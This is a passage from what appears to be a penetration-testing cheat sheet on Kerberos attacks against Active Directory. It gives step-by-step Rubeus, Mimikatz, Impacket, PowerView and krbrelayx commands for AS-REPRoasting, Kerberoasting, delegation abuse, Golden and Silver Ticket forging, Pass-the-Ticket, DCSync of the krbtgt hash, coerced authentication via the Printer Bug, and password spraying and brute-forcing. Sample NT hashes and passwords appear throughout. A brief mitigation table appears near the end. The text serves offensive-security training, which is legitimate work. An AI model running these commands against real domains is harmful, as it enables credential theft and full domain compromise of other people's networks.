  • OPSEC: Use Kerberos auth (--kerberos / --use-kcache) where possible; use AES keys for least noise

6. Kerberos Attacks

Kerberos is the default authentication protocol for domain accounts since Windows 2000, running on port 88. It is a stateless, ticket-based Zero-knowledge proof protocol - the KDC does not record previous transactions, and a valid Ticket Granting Ticket (TGT) implies the holder has already proven their identity.

Note: Throughout this section, "TGS ticket" and "Service Ticket (ST)" are used interchangeably. The Ticket Granting Service (TGS) is a KDC component that issues service tickets.

6.1 Kerberos Authentication Process

Authentication proceeds in three phases between the client, the KDC (Domain Controller), and the target service.

PhaseRequestResponseEncrypted With
Authentication Service (AS)AS-REQ (authenticator + username)AS-REP (TGT + session key)TGT → KDC key; session key → user key
Ticket-Granting Service (TGS)TGS-REQ (TGT + authenticator + SPN)TGS-REP (ST + new session key)ST → service account key; session key → user/KDC session key
Application Request (AP)AP-REQ (ST + authenticator)AP-REP (timestamp encrypted with session key)Authenticator → user/service session key

Pre-authentication (default) requires the client to encrypt the current timestamp with their key as proof of identity. If disabled, the KDC returns a TGT to any requestor for that account - the basis for AS-REPRoasting.

6.2 Kerberos Attack Overview

Attack CategoryAttackRequires Auth?Target
Ticket RequestAS-REPRoastingNoAccounts with pre-auth disabled
Ticket RequestKerberoastingYes (any domain user)User accounts with SPNs
DelegationUnconstrained DelegationYesServers with TRUSTED_FOR_DELEGATION
DelegationConstrained DelegationYesAccounts with msDS-AllowedToDelegateTo
DelegationRBCDYesAccounts with msDS-AllowedToActOnBehalfOfOtherIdentity
Ticket ForgingGolden TicketRequires krbtgt hashTGT forgery (domain-wide)
Ticket ForgingSilver TicketRequires service account hashTGS forgery (per service)
ReconUser Enumeration / Password SprayNoKDC error-code differences

6.3 AS-REPRoasting

AS-REPRoasting targets accounts with DONT_REQ_PREAUTH set in their UAC flags. The KDC returns an AS-REP containing a session key encrypted with the user's password - crackable offline. No prior authentication is required.

This attack can also be "targeted": if an attacker has GenericWrite or GenericAll over an account, they can enable DONT_REQ_PREAUTH, roast the account, then disable it.

6.3.1 Enumeration from Windows

# PowerView: find accounts with DONT_REQ_PREAUTH
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Rubeus: scan for vulnerable accounts
.\Rubeus.exe preauthscan

# Rubeus: enumerate + dump all DONT_REQ_PREAUTH accounts
.\Rubeus.exe asreproast /format:hashcat

6.3.2 Attack from Windows

# Rubeus: roast specific user, write to file
.\Rubeus.exe asreproast /user:jenna.smith /domain:[domain] /dc:[dc].[domain] /nowrap /outfile:hashes.txt

# PowerView: enable DONT_REQ_PREAUTH on a target (targeted AS-REPRoasting, requires GenericWrite)
Import-Module .\PowerView.ps1
Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose

6.3.3 Enumeration and Attack from Linux

Note: When using Kerberos on Linux, add the DC's hostname to /etc/hosts before attacking.
# GetNPUsers.py: enumerate vulnerable accounts (with creds)
GetNPUsers.py [domain]/[user]

# GetNPUsers.py: request hashes for all vulnerable accounts
GetNPUsers.py [domain]/[user] -request

# GetNPUsers.py: find vulnerable accounts without credentials (username list only)
GetNPUsers.py INLANEFREIGHT/ -dc-ip [target-ip] -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass

6.3.4 Hash Cracking

# Hashcat mode 18200 = Kerberos 5, etype 23, AS-REP
# Windows
hashcat.exe -m 18200 C:\Tools\hashes.txt C:\Tools\rockyou.txt -O

# Linux
hashcat -m 18200 hashes.txt rockyou.txt

Methodology

  • Enumerate accounts with pre-auth disabled (Windows): 
    Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
  • Enumerate accounts with pre-auth disabled (Linux): 
    GetNPUsers.py [domain]/pixis
  • Request AS-REP hashes for all vulnerable accounts (Windows): 
    .\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:hashes.txt
  • Request AS-REP hashes for all vulnerable accounts (Linux): 
    GetNPUsers.py [domain]/[user] -request
# Or without credentials:
GetNPUsers.py INLANEFREIGHT/ -dc-ip [target-ip] -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
  • Crack hashes offline: 
    hashcat -m 18200 hashes.txt rockyou.txt
  • Targeted AS-REPRoasting (requires GenericWrite on target): 
    Import-Module .\PowerView.ps1
Set-DomainObject -Identity targetUser -XOR @{useraccountcontrol=4194304} -Verbose
# ... roast ... then clean up:
Set-DomainObject -Identity targetUser -XOR @{useraccountcontrol=4194304} -Verbose

6.4 Kerberoasting

Kerberoasting abuses the fact that any authenticated domain user can request a Service Ticket (ST) for any SPN. STs are encrypted with the service account's password - accounts with weak passwords can be cracked offline. Requires at minimum a valid domain user account (or SYSTEM shell on a domain-joined host).

When SPN accounts use RC4 ($krb5tgs$23$* prefix), tickets are significantly faster to crack than AES ($krb5tgs$18$* prefix). Use the /tgtdeleg flag in Rubeus to downgrade to RC4 where the domain supports it.

6.4.1 Manual Detection (LDAP)

# LDAP filter for user accounts with SPNs set
# &(objectCategory=person)(objectClass=user)(servicePrincipalName=*)

# PowerShell script to find Kerberoastable accounts
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results) {
   $userEntry = $result.GetDirectoryEntry()
   Write-host "User"
   Write-Host "===="
   Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
   Write-host ""
   Write-host "SPNs"
   Write-Host "===="
   foreach($SPN in $userEntry.servicePrincipalName) {
       $SPN
   }
   Write-host ""
}
# Windows built-in: setspn
setspn -T [domain] -Q */*

6.4.2 Enumeration from Windows

# PowerView: enumerate accounts with SPNs
Import-Module .\PowerView.ps1
Get-DomainUser -SPN

# PowerView: enumerate + request tickets in one step (Hashcat format)
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation

# PowerView: Invoke-Kerberoast shortcut
Import-Module .\PowerView.ps1
Invoke-Kerberoast

6.4.3 Attack from Windows with Rubeus

# Kerberoast all users
.\Rubeus.exe kerberoast /nowrap

# Kerberoast a specific user, save to file
.\Rubeus.exe kerberoast /user:sqldev /nowrap /outfile:kerb.txt

# Show statistics without sending ticket requests
.\Rubeus.exe kerberoast /stats

# Filter by password set date range
.\Rubeus.exe kerberoast /pwdsetafter:01-01-2020 /pwdsetbefore:01-01-2023 /nowrap

# Force RC4 downgrade (for AES-enabled accounts where RC4 is still supported)
.\Rubeus.exe kerberoast /tgtdeleg /nowrap

6.4.4 Kerberoasting Without Authentication

If a user with DONT_REQ_PREAUTH is known, their account can be used to request TGS tickets without being authenticated. Use Rubeus createnetonly to create an unauthenticated logon session first.

# Step 1: Create a sacrificial unauthenticated process
.\Rubeus.exe createnetonly /program:cmd.exe /show

# Step 2: From the new cmd window - attempt standard kerberoast (will fail without auth)
# .\Rubeus.exe kerberoast  ← fails

# Step 3: Use /nopreauth with the DONT_REQ_PREAUTH account username and target SPN
.\Rubeus.exe kerberoast /nopreauth:amber.smith /domain:[domain] /spn:MSSQLSvc/SQL01:1433 /nowrap

# For multiple SPNs use a file:
.\Rubeus.exe kerberoast /nopreauth:amber.smith /domain:[domain] /spns:listofspn.txt /nowrap

6.4.5 Attack from Linux

# Enumerate Kerberoastable accounts
GetUserSPNs.py [domain]/[user]

# Request hashes for all Kerberoastable accounts
GetUserSPNs.py [domain]/[user] -request

# Target a specific SPN
GetUserSPNs.py [domain]/[user] -request-user sqldev

6.4.6 Hash Cracking

# Hashcat mode 13100 = Kerberos 5, etype 23, TGS-REP (RC4)
# Windows
hashcat.exe -m 13100 C:\Tools\kerb.txt C:\Tools\rockyou.txt -O

# Linux
hashcat -m 13100 hashes.txt rockyou.txt

Methodology

  • Enumerate Kerberoastable accounts (Windows): 
    Import-Module .\PowerView.ps1
Get-DomainUser -SPN
  • Enumerate Kerberoastable accounts (Linux): 
    GetUserSPNs.py [domain]/username
  • Request all TGS hashes (Windows - Rubeus): 
    .\Rubeus.exe kerberoast /nowrap /outfile:kerb.txt
  • Request all TGS hashes (Linux - Impacket): 
    GetUserSPNs.py [domain]/[user] -request -outputfile hashes.txt
  • Check encryption types; downgrade to RC4 if needed: 
    .\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /tgtdeleg /nowrap
  • Crack hashes: 
    hashcat -m 13100 hashes.txt rockyou.txt

6.5 Kerberos Delegations

Kerberos delegation allows a service to impersonate a user when accessing a second service. Three types exist:

TypeAttributeUAC FlagScope
UnconstrainedN/ATRUSTED_FOR_DELEGATIONAny service
ConstrainedmsDS-AllowedToDelegateToTRUSTED_TO_AUTH_FOR_DELEGATIONListed SPNs only
Resource-Based Constrained (RBCD)msDS-AllowedToActOnBehalfOfOtherIdentityN/AConfigured at the resource

6.5.1 S4U Extensions

ExtensionPurposeUsed When
S4U2ProxyService requests TGS on behalf of a user to access another serviceUser has previously authenticated to the front-end service via Kerberos (TGS available)
S4U2SelfService obtains a forwardable TGS to itself on behalf of any arbitrary userUser authenticated via non-Kerberos protocol (e.g. NTLM); requires protocol transition
Note: If constrained delegation uses "Use any authentication protocol" (protocol transition), the service can use S4U2Self to impersonate arbitrary users without waiting for authentication.

6.6 Unconstrained Delegation Attacks

When a server has unconstrained delegation enabled, every incoming TGS ticket includes a copy of the user's TGT. Compromising this server gives access to those TGTs.

6.6.1 Unconstrained Delegation - Waiting for Privileged Users (Windows)

# Enumerate computers with unconstrained delegation (PowerView)
Import-Module .\PowerView.ps1
Get-DomainComputer -Unconstrained

# Enumerate user accounts with unconstrained delegation
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Monitor for incoming TGTs on a compromised unconstrained delegation host
.\Rubeus.exe monitor /interval:5 /nowrap

# Enumerate groups the captured user belongs to
Import-Module .\PowerView.ps1
Get-DomainGroup -MemberIdentity [user]

# Use the captured TGT to request a TGS for DC CIFS
.\Rubeus.exe asktgs /ticket:<base64TGT> /service:cifs/[dc].INLANEFREIGHT.local /ptt

# Or renew the TGT directly
.\Rubeus.exe renew /ticket:<base64TGT> /ptt

# Access the DC filesystem
dir \\[dc].[domain]\c$

# DCSync using Mimikatz (after injecting the DC's TGT)
mimikatz # lsadump::dcsync /user:[user]

# Ask for a TGT using the compromised user's NTLM hash
.\Rubeus.exe asktgt /rc4:[ntlm-hash] /user:[user] /ptt

6.6.2 Printer Bug (SpoolSample) - Windows

The Printer Bug (MS-RPRN) coerces a target server to authenticate back to an attacker-controlled host. Combined with unconstrained delegation, this forces a DC to send its TGT to the compromised host.

# Step 1: Start Rubeus in monitor mode on the unconstrained delegation host (SQL01)
.\Rubeus.exe monitor /interval:5 /nowrap

# Step 2: Trigger printer bug - coerce [dc] to authenticate back to SQL01
.\SpoolSample.exe [dc].[domain] sql01.[domain]

# Step 3: Rubeus captures the [dc]$ TGT - renew and import it
.\Rubeus.exe renew /ticket:<base64TGT> /ptt

# Step 4: DCSync using Mimikatz with the DC machine account TGT in memory
mimikatz # lsadump::dcsync /user:[user]

6.6.3 Unconstrained Delegation - User Accounts / krbrelayx (Linux)

If a compromised user account has unconstrained delegation set, use krbrelayx to add a fake DNS record and SPN, then trigger coerced auth to harvest the DC's TGT.

# Install krbrelayx
git clone -q https://github.com/dirkjanm/krbrelayx; cd krbrelayx

# Step 1: Create a fake DNS record pointing to the attacker's IP
python dnstool.py -u [domain]\\pixis -p [password] -r roguecomputer.[domain] -d [target-ip] --action add [target-ip]

# Step 2: Verify the DNS record
nslookup roguecomputer.[domain] [dc].[domain]

# Step 3: Add CIFS SPN to the compromised unconstrained delegation user (sqldev)
python addspn.py -u [domain]\\pixis -p [password] --target-type samname -t sqldev -s CIFS/roguecomputer.[domain] [dc].[domain]

# Step 4: Start krbrelayx to capture TGTs (supply the NT hash of the compromised account)
sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58

# Step 5a: Trigger printer bug with printerbug.py
python3 printerbug.py [domain]/[user]:[password] roguecomputer.[domain]

# Step 5b: Alternative - use dementor.py
python dementor.py -u pixis -p [password] -d [domain] roguecomputer.[domain] [dc].[domain]

# Step 6: Use the captured .ccache ticket for DCSync
export KRB5CCNAME=./[dc]\$@[domain]@[domain].ccache
secretsdump.py -k -no-pass [dc].[domain]

# Fix impacket if krbrelayx errors occur
sudo apt remove python3-impacket impacket-scripts
git clone -q https://github.com/fortra/impacket; cd impacket
sudo python3 -m pip install .

Methodology

  • Enumerate computers/users with unconstrained delegation: 
    Import-Module .\PowerView.ps1
Get-DomainComputer -Unconstrained
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
  • Monitor for incoming TGTs on the compromised host: 
    .\Rubeus.exe monitor /interval:5 /nowrap
  • Trigger Printer Bug to coerce DC authentication: 
    .\SpoolSample.exe [dc].[domain] sql01.[domain]
  • Import captured TGT and perform DCSync: 
    .\Rubeus.exe renew /ticket:<base64TGT> /ptt
# Then in Mimikatz:
# lsadump::dcsync /user:krbtgt
  • Linux: use krbrelayx to capture TGT via coerced auth: 
    sudo python krbrelayx.py -hashes :<NThash_of_sqldev>
python3 printerbug.py [domain]/[user]:[password] roguecomputer.[domain]
export KRB5CCNAME=./[dc]\$@[domain]@[domain].ccache
secretsdump.py -k -no-pass [dc].[domain]

6.7 Constrained Delegation Attacks

Constrained delegation restricts which services a server can impersonate users to. Two abuse primitives exist:

  • Abuse any service on the target: Modify the unencrypted SPN in the AP-REQ to access any service exposed by the same account (e.g., change SQL to CIFS).
  • Impersonate any user (requires protocol transition): Use S4U2Self to generate a forwardable TGS as an arbitrary user, then S4U2Proxy to access the target service.

6.7.1 Attack from Windows

# Enumerate computers with constrained delegation
Import-Module .\PowerView.ps1
Get-DomainComputer -TrustedToAuth

# Get machine account NTLM hash (on the compromised constrained delegation host)
.\mimikatz.exe privilege::debug sekurlsa::msv exit

# Rubeus s4u: impersonate Administrator to access www/WS01 via HTTP
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.[domain] /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt

# Verify the ticket
klist

# Use WinRM with the ticket
Enter-PSSession ws01.[domain]

Rubeus performs: AS-REQ (get TGT as DMZ01$) → S4U2Self (get TGS as Administrator to DMZ01$) → S4U2Proxy (exchange for TGS to www/WS01, substituting alternate service HTTP).

6.7.2 Attack from Linux

# Find all delegation types
findDelegation.py [domain]/[user]:[password]

# getST.py: S4U attack - impersonate Administrator to TERMSRV/[dc]
getST.py -spn TERMSRV/[dc] '[domain]/[user]:[password]' -impersonate Administrator

# Use the ticket
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass [domain]/administrator@[dc] -debug

Methodology

  • Enumerate constrained delegation accounts: 
    Import-Module .\PowerView.ps1
Get-DomainComputer -TrustedToAuth
  • Linux: find all delegation types: 
    findDelegation.py [domain]/[user]:[password]
  • Get NT hash of the constrained delegation machine account: 
    .\mimikatz.exe privilege::debug sekurlsa::msv exit
  • Perform S4U attack to impersonate a privileged user (Windows): 
    .\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:<allowed-spn> /altservice:CIFS /user:MACHINE$ /rc4:<NThash> /ptt
  • Perform S4U attack (Linux): 
    getST.py -spn <SPN> 'DOMAIN/user:pass' -impersonate Administrator
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass DOMAIN/administrator@TARGET

6.8 Resource-Based Constrained Delegation (RBCD)

RBCD reverses delegation control: the target resource maintains a trust list (msDS-AllowedToActOnBehalfOfOtherIdentity) of principals that may delegate to it. Any account with GenericWrite, GenericAll, WriteProperty, or WriteDACL over a computer object can modify this attribute.

The attack requires two things:

  1. A user/group with write access on the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity.
  2. Control of an account with an SPN (or create a fake computer account, allowed by default via ms-DS-MachineAccountQuota = 10).

6.8.1 RBCD from Windows

# Enumerate which users have required rights on computers
Import-Module C:\Tools\PowerView.ps1
$computers = Get-DomainComputer
$users = Get-DomainUser
$accessRights = "GenericWrite","GenericAll","WriteProperty","WriteDacl"
foreach ($computer in $computers) {
   $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName -ResolveGUIDs
   foreach ($user in $users) {
       $hasAccess = $acl | ?{$_.SecurityIdentifier -eq $user.ObjectSID} | %{($_.ActiveDirectoryRights -match ($accessRights -join '|'))}
       if ($hasAccess) {
           Write-Output "$($user.SamAccountName) has the required access rights on $($computer.Name)"
       }
   }
}

# Step 1: Create a fake computer account using PowerMad
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount [machine] -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)

# Step 2: Build the security descriptor and modify target computer's RBCD attribute
Import-Module .\PowerView.ps1
$ComputerSid = Get-DomainComputer [machine] -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
$credentials = New-Object System.Management.Automation.PSCredential "[DOMAIN]\[user]", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
Get-DomainComputer [dc] | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose

# Step 3: Get the NT hash of the fake computer account
.\Rubeus.exe hash /password:Hackthebox123+! /user:[machine]$ /domain:[domain]

# Step 4: S4U attack to impersonate Administrator on [dc] via CIFS
.\Rubeus.exe s4u /user:[machine]$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/[dc].[domain] /ptt

# Optional: add alternate services
# .\Rubeus.exe s4u ... /altservice:host,RPCSS,wsman,http,ldap,krbtgt,winrm

# Step 5: Verify the ticket and access the target
klist
ls \\[dc].[domain]\c$

# Cleanup: clear the RBCD attribute
Get-DomainComputer [dc] | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity -Credential $credentials -Verbose

6.8.2 RBCD from Linux

# Step 1: Create a fake computer account
addcomputer.py -computer-name '[machine]$' -computer-pass 'Hackthebox123+!' -dc-ip [target-ip] [domain]/[user]

# Step 2: Modify target computer's RBCD attribute
python3 rbcd.py -dc-ip [target-ip] -t [dc] -f [machine] [domain]\\[user]:Y3t4n0th3rP4ssw0rd

# Step 3: S4U2Self + S4U2Proxy to get a ticket as Administrator
getST.py -spn cifs/[dc].[domain] -impersonate Administrator -dc-ip [target-ip] [domain]/[user]:'[password]'

# Step 4: Use the ticket
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass [dc].[domain]
Note: Add [dc].[domain] to /etc/hosts before running impacket tools with Kerberos.

Methodology

  • Identify users with write rights on computer objects: 
    Import-Module .\PowerView.ps1
# Run SearchRBCD.ps1 or query BloodHound for GenericWrite/GenericAll on computers
  • Create a fake computer account (Windows): 
    Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount [machine] -Password $(ConvertTo-SecureString "Hackthebox123+!" -AsPlainText -Force)
  • Create a fake computer account (Linux): 
    addcomputer.py -computer-name '[machine]$' -computer-pass 'Hackthebox123+!' -dc-ip <DC_IP> domain.local/user
  • Modify target's msDS-AllowedToActOnBehalfOfOtherIdentity (Windows): 
    $ComputerSid = Get-DomainComputer [machine] -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer [dc] | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $creds -Verbose
  • Modify target's RBCD attribute (Linux): 
    python3 rbcd.py -dc-ip <DC_IP> -t TARGET_COMPUTER -f [machine] domain\\user:pass
  • S4U attack to get Administrator ticket and access target: 
    getST.py -spn cifs/TARGET.domain.local -impersonate Administrator -dc-ip <DC_IP> domain.local/[machine]:'pass'
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass TARGET.domain.local

6.9 Golden Ticket

A Golden Ticket is a forged TGT signed with the krbtgt account's NTLM hash. Since the KDC uses krbtgt's key to verify TGTs, a forged ticket with arbitrary PAC contents (e.g., membership in Domain Admins) is accepted as valid. Mimikatz generates golden tickets with a 10-year lifetime by default.

Required material: domain name, domain SID, username to impersonate, krbtgt NTLM hash. The krbtgt password must be rotated twice to invalidate existing golden tickets (both current and previous passwords are valid).

6.9.1 Golden Ticket from Windows

# Step 1: Get domain SID
Import-Module .\PowerView.ps1
Get-DomainSID

# Step 2: Get krbtgt NTLM hash (requires DCSync privileges)
.\mimikatz.exe
# mimikatz # lsadump::dcsync /user:krbtgt /domain:[domain]

# Step 3: Forge the Golden Ticket and inject into current session
# mimikatz # kerberos::golden /domain:[domain] /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt

# Step 4: Verify the ticket
klist

# Step 5: Use the ticket
Enter-PSSession [dc]

6.9.2 Golden Ticket from Linux

# Step 1: Retrieve the domain SID
lookupsid.py [domain]/pixis@[dc].[domain] -domain-sids

# Step 2: Forge the Golden Ticket
ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain [domain] Administrator

# Step 3: Use the ticket
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass [dc].[domain]

Methodology

  • Obtain domain SID: 
    Import-Module .\PowerView.ps1
Get-DomainSID
  • Obtain krbtgt NTLM hash via DCSync: 
    .\mimikatz.exe
# mimikatz # lsadump::dcsync /user:krbtgt /domain:[domain]
  • Forge and inject Golden Ticket (Windows): 
    # mimikatz # kerberos::golden /domain:[domain] /user:Administrator /sid:<SID> /rc4:<krbtgt_hash> /ptt
  • Forge and use Golden Ticket (Linux): 
    lookupsid.py domain/user@dc -domain-sids
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain domain.local Administrator
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass [dc].domain.local

6.10 Silver Ticket

A Silver Ticket is a forged TGS ticket signed with a service account's NTLM hash. Unlike Golden Tickets, the DC is never contacted - the forged TGS goes directly to the target service. Silver Tickets are more stealthy (logs only on the target host) but are scoped to the specific service/host whose account was compromised.

Required material: domain SID, service account (or machine account) NTLM hash, target hostname, SPN, username to impersonate.

6.10.1 Silver Ticket from Windows

# Step 1: Get domain SID
Import-Module .\PowerView.ps1
Get-DomainSID

# Step 2: Forge the Silver Ticket (CIFS to sql01 using SQL01$'s hash), inject /ptt
.\mimikatz.exe
# mimikatz # kerberos::golden /domain:[domain] /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.[domain] /service:cifs /ptt

# Step 3: Verify the ticket
klist

# Step 4: Access the target
dir \\sql01.[domain]\c$

# Alternative: save the Silver Ticket to file then use a sacrificial process
C:\Tools\mimikatz.exe "kerberos::golden /domain:[domain] /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.[domain] /service:cifs /ticket:sql01.kirbi" exit

# Create sacrificial process
.\Rubeus.exe createnetonly /program:cmd.exe /show

# Inject ticket into the sacrificial process
.\Rubeus.exe ptt /ticket:sql01.kirbi

# Use PSExec with the injected ticket
PSExec.exe -accepteula \\sql01.[domain] cmd

6.10.2 Silver Ticket from Linux

# Step 1: Retrieve domain SID
lookupsid.py [domain]/pixis@[dc].[domain] -domain-sids

# Step 2: Forge Silver Ticket for CIFS on sql01
ticketer.py -nthash ff955e93a130f5bb1a6565f32b7dc127 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain [domain] -spn cifs/sql01.[domain] Administrator

# Step 3: Use the ticket via smbclient.py
export KRB5CCNAME=./Administrator.ccache
smbclient.py -k -no-pass sql01.[domain]

# Or get a SYSTEM shell via psexec.py (Impacket updates SPN on the fly)
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass sql01.[domain]

Methodology

  • Obtain the service/machine account NTLM hash (via Mimikatz DCSync or sekurlsa::msv): 
    .\mimikatz.exe privilege::debug sekurlsa::msv exit
  • Get domain SID: 
    lookupsid.py domain/user@dc -domain-sids
  • Forge Silver Ticket (Windows - inject to session): 
    # mimikatz # kerberos::golden /domain:domain.local /user:Administrator /sid:<SID> /rc4:<hash> /target:<target> /service:cifs /ptt
  • Forge Silver Ticket (Linux): 
    ticketer.py -nthash <hash> -domain-sid <SID> -domain domain.local -spn cifs/target.domain.local Administrator
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass target.domain.local

6.11 Pass-the-Ticket (PtT)

Pass-the-Ticket moves laterally by injecting an existing Kerberos TGT or TGS into a new logon session without touching LSASS directly. Critical concept: always use a sacrificial process to avoid overwriting existing tickets and taking services down.

6.11.1 Sacrificial Processes

A sacrificial process creates a new logon session with its own LUID. Tickets injected into this session do not affect existing sessions. Requires local admin rights.

# Create a sacrificial cmd.exe process (use the LUID to target it)
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# List all readable tickets and their LUIDs
.\Rubeus.exe triage

# Dump a specific user's TGT from LSASS
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap

# Renew the dumped TGT and inject into current session
.\Rubeus.exe renew /ticket:<base64TGT> /ptt

6.11.2 Pass-the-Ticket with Mimikatz

# Export all tickets from LSASS (requires SYSTEM)
.\mimikatz.exe
# mimikatz # privilege::debug
# mimikatz # sekurlsa::tickets /export

# Inject a specific ticket into the current session
# mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-local.example.com.kirbi

# Verify injected tickets
klist

# Access the target using the injected ticket
dir \\[dc]\\c$

Methodology

  • Create a sacrificial process: 
    .\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
  • List all available tickets on the system: 
    .\Rubeus.exe triage
  • Dump a target user's TGT from LSASS: 
    .\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
  • Renew and inject the TGT into the current session: 
    .\Rubeus.exe renew /ticket:<base64TGT> /ptt
klist
  • Alternatively: export and inject tickets with Mimikatz: 
    .\mimikatz.exe privilege::debug
# sekurlsa::tickets /export
# kerberos::ptt <ticket.kirbi>

6.12 Account Enumeration and Password Spraying with Kerbrute

The KDC returns different error codes for valid vs invalid users, and for correct vs incorrect passwords in AS-REQ - exploitable for enumeration and password spraying without full authentication. Kerbrute uses this behavior.

Pre-auth failures do not generate Event ID 4625 (traditional logon failure); they generate Event ID 4768 (TGT request) and 4771 (pre-auth failed).

6.12.1 Kerbrute Installation and Usage

# Install
mv ~/Downloads/kerbrute_linux_amd64 kerbrute
chmod +x ./kerbrute

# Enumerate valid usernames (does NOT lock out accounts)
kerbrute userenum users.txt --dc [dc].[domain] -d [domain]

# Password spraying (DOES increment failed login count - can lock out accounts)
kerbrute passwordspray users.txt [password] --dc [dc].[domain] -d [domain]
# User notes: additional Kerbrute usage (kerbrute.py - legacy Python version)
python kerbrute.py -domain [domain] -dc [target-ip] -t 100 -users /home/kali/Desktop/users.txt

# Bruteforce with both username and password list
python kerbrute.py -domain [domain] -dc [target-ip] -t 100 -users /home/kali/Desktop/users.txt -passwords /home/kali/Desktop/password.txt

# Impacket: enumerate usernames via lookupsid
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@[target-ip] | tee usernames

Methodology

  • Enumerate valid usernames with Kerbrute (no lockout risk): 
    kerbrute userenum users.txt --dc [dc].domain.local -d domain.local
  • Password spray with a single password (lockout risk - verify policy first): 
    kerbrute passwordspray users.txt 'Password123' --dc [dc].domain.local -d domain.local
  • Harvest TGTs every 30 seconds with Rubeus: 
    .\Rubeus.exe harvest /interval:30
  • Brute force usernames and passwords (user notes - kerbrute.py): 
    python kerbrute.py -domain [domain] -dc [target-ip] -t 100 -users users.txt -passwords passwords.txt -outputfile passwords-found.txt
  • Brute force user hashes with getTGT.py (iterate username:hash pairs): 
    #!/bin/bash
for i in $(cat wordlists/valid.usernames); do
  for j in $(cat wordlists/hashes.ntds); do
    echo "trying $i:$j"
    getTGT.py [domain]/$i -hashes $j:$j
    sleep 5
  done
done
  • AS-REP Roasting with GetNPUsers (known users, no auth): 
    python3 GetNPUsers.py -dc-ip <DC_IP> [domain]/ -usersfile users.txt

6.13 Hardening and Detection

6.13.1 Mitigations per Attack

AttackMitigations
AS-REPRoasting Enable pre-authentication on all accounts; use AES encryption instead of RC4; enforce strong passwords on service accounts; monitor service accounts for unusual access patterns
Kerberoasting Use strong (25+ char) passwords for service accounts; use Group Managed Service Accounts (GMSA) with auto-rotating passwords; do not place service accounts in privileged groups; rotate krbtgt password at least every 180 days
Delegation Abuse Disable unconstrained delegation where possible; place sensitive accounts in Protected Users group; enable "Account is sensitive and cannot be delegated"; apply principle of least privilege
Golden Ticket Least-privilege access model; separate non-interactive admin accounts; MFA on OWA/VPN; EDR to detect Mimikatz; rotate krbtgt password twice (wait for convergence between resets)
Silver Ticket Strong service account passwords (25+ chars); use Managed Service Accounts; don't place service accounts in privileged groups; limit service account permissions to minimum required
Pass-the-Ticket Monitor process creation/destruction events; watch for unusual TGT/TGS requests; privileged identity management; monitor named pipes (Pipelist/Pipe Monitor)

6.13.2 Detection: PowerShell Checks

# Find accounts with pre-authentication disabled
